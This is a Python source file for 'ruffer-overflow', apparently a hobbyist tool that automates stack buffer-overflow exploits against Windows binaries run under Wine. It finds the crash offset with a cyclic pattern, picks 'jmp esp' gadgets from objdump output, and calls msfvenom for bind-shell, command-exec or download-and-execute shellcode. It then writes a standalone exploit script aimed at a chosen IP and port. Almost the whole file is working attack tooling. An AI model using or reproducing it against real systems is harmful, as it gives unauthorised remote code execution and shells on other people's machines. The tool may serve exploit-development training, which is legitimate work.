#!/usr/bin/python3

import socket
import os
import sys
import getopt
import time
import subprocess
import re
import struct

#region tuning
PATTERN_SIZE = 5000 #characters
LOAD_TIME = 5 #seconds
#endregion

#region banners
def print_banner():
    """prints of the "ruffer-overflow" banner
    """
    banner =  "           ____,'`-,\n"
    banner += "      _,--'   ,/::.;\n"
    banner += "   ,-'       ,/::,' `---.___        ___,_\n"
    banner += "   |       ,:';:/        ;'\"';\"`--./ ,-^.;--.\n"
    banner += "   |:     ,:';,'         '         `.   ;`   `-.\n"
    banner += "    \\:.,:::/;/ -:.                   `  | `     `-.\n"
    banner += "     \\:::,'//__.;  ,;  ,  ,  :.`-.   :. |  ;       :.\n"
    banner += "      \\,',';/O)^. :'  ;  :   '__` `  :::`.       .:' )\n"
    banner += "      |,'  |\\__,: ;      ;  '/O)`.   :::`;       ' ,'\n"
    banner += "           |`--''            \\__,' , ::::(       ,'\n"
    banner += "           `    ,            `--' ,: :::,'\\   ,-'\n"
    banner += "            | ,;         ,    ,::'  ,:::   |,'\n"
    banner += "            |,:        .(          ,:::|   `\n"
    banner += "            ::'_   _   ::         ,::/:|\n"
    banner += "           ,',' `-' \\   `.      ,:::/,:|\n"
    banner += "          | : _  _   |   '     ,::,' :::\n"
    banner += "          | \\ O`'O  ,',   ,    :,'   ;::\n"
    banner += "           \\ `-'`--',:' ,' , ,,'      ::\n"
    banner += "            ``:.:.__   ',-','        ::'\n"
    banner += "    -hrr-      `--.__, ,::.         ::'\n"
    banner += "                   |:  ::::.       ::'\n"
    banner += "                   |:  ::::::    ,::'\n"
    banner += "########################################################\n"
    banner += "#                   ruffer-overflow                    #\n"
    banner += "#           don't \"bark\" up the wrong tree.            #\n"
    banner += "#======================================================#\n"
    banner += "#         weak-sauce tool for buffer-overflow          #\n"
    banner += "#              please don't crime with it.             #\n"
    banner += "########################################################\n"
    print(banner)
#endregion

#region ip validation
"""
copied from: https://stackoverflow.com/a/4017219
post by danilo bargen and tzot
"""
def is_valid_ipv4_address(address):
    """validate an ipv4 address

    Args:
        address (str): suspected ipv4 address to validate

    Returns:
        boolean: if the string is a valid ipv4 address
    """
    try:
        socket.inet_pton(socket.AF_INET, address)
    except AttributeError:  # no inet_pton here, sorry
        try:
            socket.inet_aton(address)
        except socket.error:
            return False
        return address.count('.') == 3
    except socket.error:  # not a valid address
        return False

    return True

def is_valid_ipv6_address(address):
    """validate an ipv6 address

    Args:
        address (str): suspected ipv6 address to validate

    Returns:
        boolean: if the string is a valid ipv6 address
    """
    try:
        socket.inet_pton(socket.AF_INET6, address)
    except socket.error:  # not a valid address
        return False
    return True

def is_valid_ip(address):
    """validate an ip address

    Args:
        address (str): suspected ip address

    Returns:
        boolean: if the string is an ip address
    """
    return is_valid_ipv4_address(address) or is_valid_ipv6_address(address)
#endregion

#region user interaction
def prompt_yn(prompt):
    """prompt the user for a yes or no answer

    Args:
        prompt (str): what to ask the user

    Returns:
        boolean: if the user said yes
    """
    response = ""
    while response not in ("y", "n"):
        response = prompt_base(prompt + "(y/n)")
    return response == "y"

def prompt_ip(prompt):
    """prompt the user for a valid ip address

    Args:
        prompt (str): what to ask the user

    Returns:
        boolean: if the user said yes
    """
    response = ""
    while not is_valid_ip(response):
        response = prompt_base(prompt)
    return response
    
def prompt_number(prompt, low_limit = 1, high_limit = 65535):
    """prompt the user for a number in a range

    Args:
        prompt (str): what to ask the user
        low_limit (int, optional): lowest allowable number (inclusive). Defaults to 1.
        high_limit (int, optional): highest allowable number (inclusive). Defaults to 65535.

    Returns:
        int: a number in the range given
    """
    while True:
        try:
            response = int(prompt_base(prompt))
            if low_limit <= response <= high_limit:
                return response
        except:
            pass

def prompt_list(prompt, options):
    """prompt the user to select an option from a list

    Args:
        prompt (str): what to ask the user
        options (str[]): allowable options for the user to select

    Returns:
        str: the option the user selected
    """
    while True:
        print(prompt)
        for i in range(0, len(options)):
            print(f"{i})\t{options[i]}")
        response = prompt_base("")
        try:
            response = int(response)
            if 0 <= response < len(options):
                return options[response]
        except:
            pass

def prompt_base(prompt):
    """the base prompt function

    Args:
        prompt (str): what to ask the user

    Returns:
        str: the users input
    """
    return input(prompt + ": ")

def log_error(error_message):
    """prints out standard logging sytle error message

    Args:
        error_message (str): error message
    """
    log(f"error: ")

def log(info):
    """prints out standard logging style

    Args:
        info (str): logging message
    """
    print(f"[{info}]")
#endregion

#region targeting
def get_local_binary_targeting_info():
    """get information regarding location and type of the binary to be exploited

    Returns:
        str: the absolute path to the binary
        str: the operating system the binary is compiled for (linux or windows)
    """
    file_location = prompt_base("where is the file located?")
    file_location = os.path.abspath(file_location)

    file_type = os.popen(f"file {file_location}").read()

    if "ELF 32-bit" in file_type:
        file_type = "linux"
    elif "PE32 executable" in file_type:
        file_type = "windows"
    elif prompt_yn("is this a linux binary?"):
        file_type = "linux"
    else:
        file_type = "windows"
    
    print(f"[{file_type} executable]")

    return (file_location, file_type)
#endregion

#region toolkit
"""pattern tools from ickerwx/pattern library on github"""
def pattern_create(length = 8192):
    """generate a non-repeating pattern to identify memory positions

    Args:
        length (int, optional): how long of a pattern to generate. Defaults to 8192.

    Returns:
        str: a non-repeating pattern
    """
    pattern = ''
    parts = ['A', 'a', '0']
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    return pattern

def pattern_offset(value, pattern = "", length = 8192):
    """calculates size of offset from buffer overflow

    Args:
        value (str): value seen in memory register
        pattern (str, optional): the original pattern, so it doesn't have to be recalculated. Defaults to regenerating the pattern.
        length (int, optional): the length of the pattern to generate for searching. Defaults to 8192.

    Returns:
        int: offset size or -1 if not found in pattern
    """
    try:
        if pattern == "":
            pattern = pattern_create(length)
        value = struct.pack('<I', int(value, 16))
        value = value.decode()
        return pattern.index(value)
    except:
        return -1

def send_message(address, port, message):
    """send a message, via tcp

    Args:
        address (str): ip address to send message to
        port (int): port number to send the message to
        message (byte[]): message to send

    Returns:
        str: response from the server
    """
    socket_connection = socket.socket( socket.AF_INET, socket.SOCK_STREAM ) # tcp
    socket_connection.connect((address, port))
    banner = socket_connection.recv(2048)
    socket_connection.send(message)
    response = socket_connection.recv(2048)
    socket_connection.close()
    return response

def generate_payload(platform):
    windows_payloads = ["windows/shell_bind_tcp", "windows/exec", "windows/download_exec"]
    if platform == "windows":
        payload_choice = prompt_list("select a payload.", windows_payloads)
        if payload_choice == "windows/shell_bind_tcp":
            lport = prompt_number("what port would you like it to listen on?")
            msfvenom = subprocess.Popen(["msfvenom", "-p", "windows/shell_bind_tcp", f"LPORT={lport}", "-f", "hex"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif payload_choice == "windows/exec":
            cmd = prompt_base("what command would you like to be executed?")
            msfvenom = subprocess.Popen(["msfvenom", "-p", "windows/exec", f"CMD={cmd}", "-f", "hex"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif payload_choice == "windows/download_exec":
            url = prompt_base("what is the url for the file you would like executed? (should be an exe)")
            file_name = prompt_base("what is the name you would like the file to be saved under?")
            msfvenom = subprocess.Popen(["msfvenom", "-p", "windows/download_exec", f"URL={url}", f"EXE={file_name}", "-f", "hex"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            print(f"[error selecting payload {payload_choice}]")
            quit()
    else: #linux
        pass
    print("[generating payload]")
    raw_payload = msfvenom.stdout.read().decode()
    payload = bytes.fromhex(raw_payload)
    return payload

def weaponize_payload(prefix, offset, address_packed, payload):
    options = ["python script", "payload file"]
    choice = prompt_list("how would you like to weaponize?", options)
    filename = prompt_base("how would you like to name the file?")
    if choice != "payload file":
        target_ip = prompt_ip("what ip would you like to target?")
        target_port = prompt_number("what port would you like to target?")
    full_payload = b""
    full_payload += prefix.encode()
    full_payload += b"A" * offset
    full_payload += address_packed
    full_payload += b"\x90" * 10
    full_payload += payload
    if choice == "python script":
        file = []
        file.append('#!/usr/bin/python3\n')
        file.append("import socket\n")
        file.append(f'buf = {full_payload}\n')
        file.append("def send_exploit(address, port, exploit):\n")
        file.append("    socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
        file.append("    socket_connection.connect((address, port))\n")
        file.append("    print(socket_connection.recv(2048))\n")
        file.append("    socket_connection.send(exploit)\n")
        file.append("    print(socket_connection.recv(2048))\n")
        file.append("    socket_connection.close()\n")
        file.append(f'send_exploit("{target_ip}", {target_port}, buf)')
        with open(filename, "w") as exploit_file:
            exploit_file.writelines(file)
    elif choice == "payload file":
        with open(filename, "wb") as exploit_file:
            exploit_file.write(full_payload)
    else:
        print("[error, no selection]")
#endregion

#region windows analysis
def check_wine_installed():
    """check if wine is installed, quit if it is not
    """
    try:
        print("[checking that wine is installed]")
        subprocess.run(["wine", "--help"], check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        print("[wine is installed]")
    except:
        print("[windows binaries require wine to be installed, aborting]")
        quit()

def analyze_windows(local_binary_targeting):
    """analyze a windows binary

    Args:
        local_binary_targeting (str, str): absolute path to binary and the type of the binary (should be windows)
    """
    # verify that wine is installed
    check_wine_installed()

    # start the binary
    print(f"[starting the binary with wine]")
    wine_instance = subprocess.Popen(["wine", local_binary_targeting[0]], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # give the binary time to load
    time.sleep(LOAD_TIME)

    # pull any ports the binary is listening to
    # todo: make this do more than one port
    print(f"[getting port number with netstat]")
    try:
        # start netstat and pull output
        netstat_results = subprocess.check_output(["netstat", "-lnpt"], stderr=subprocess.PIPE).decode("utf-8")

        # filter based on "LISTENING" and pid
        netstat_results = [line for line in netstat_results.splitlines() if str(wine_instance.pid) in line and "LISTEN" in line]
        
        # get the port number (first number following a semicolon)
        port = int(re.search(r":\d+", netstat_results[0]).group(0).strip(":"))

        print(f"[{local_binary_targeting[0]} is listening on port {port}]")
    except:
        # no ports open
        port = -1
        print(f"[{local_binary_targeting[0]} is a console app]")
        # kill the program, we'll need to pass it arguments
        wine_instance.terminate()

    # add a prefix to the pattern
    prefix = prompt_base("is there a prefix for targeting? (leave blank if no)")

    # create the message
    pattern = pattern_create(length=PATTERN_SIZE)
    map_message = prefix + pattern

    if port > 0:
        # send the message via tcp
        print("[expect to see an error message, just close it]")
        map_message = str.encode(map_message)
        send_message("localhost", port, map_message)

        try:
            # catch the error message
            stderr = wine_instance.stderr.read()
            error_message = stderr.decode()

            # extract the offset pattern
            offset_pattern = re.search(r"Unhandled page fault on read access to 0x[0-9a-f]{8}", error_message).group(0)
            offset_pattern = offset_pattern.strip("Unhandled page fault on read access to 0x")

            # calculate the offset
            offset = pattern_offset(offset_pattern, pattern=pattern)
        except:
            offset = -1

        if offset > 0:
            print(f"[found offset at {offset}]")
        else:
            print("[unable to find offset]")
            quit()


    else:
        # pass the message in via command line

        pass

    # get any additional binaries that may have usable jump instructions
    additional_binaries = prompt_base("are there any dlls associated with this code? (separate with spaces)")
    
    # put them all in a list, adjust to absolute paths
    all_binaries = [local_binary_targeting[0]]
    all_binaries.extend([os.path.abspath(binary) for binary in additional_binaries.split(" ")])

    all_targetable_jumps = []

    # locate targetable jumps
    print("[locating targetable jmps]")
    for binary in all_binaries:
        objdump = subprocess.Popen(["objdump", "-D", binary],stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        grepjmp = subprocess.Popen(["grep", "jmp"], stdin=objdump.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        grepesp = subprocess.Popen(["grep", "esp"], stdin=grepjmp.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        results = grepesp.stdout.readlines()
        if results is not None:
            for line in results:
                instruction = line.decode().strip()
                all_targetable_jumps.append(instruction)

    # select a target
    if len(all_targetable_jumps):
        selected_target = prompt_list("select a target.", all_targetable_jumps)
    else: 
        print("[no jump targets found]")
        quit()

    # convert address to little endian format
    address = selected_target[:8]
    address_packed = struct.pack("<I", int(address, 16))

    print(f"[address selected 0x{address} packed into {address_packed.hex()} ]")

    payload = generate_payload(local_binary_targeting[1])

    weaponize_payload(prefix, offset, address_packed, payload)
#endregion

#region linux analysis
def analyze_linux(local_binary_targeting):
    """analyze a linux binary

    Args:
        local_binary_targeting (str, str): absolute path to binary and the type of the binary (should be linux)
    """
    if local_binary_targeting[2] == "console":
        Exception("not implemented")
    else:
        Exception("not implemented")
#endregion

if __name__ == "__main__":
    print_banner()
    local_binary_targeting = get_local_binary_targeting_info()
    if local_binary_targeting[1] == "windows":
        analyze_windows(local_binary_targeting)
    else:
        analyze_linux(local_binary_targeting)
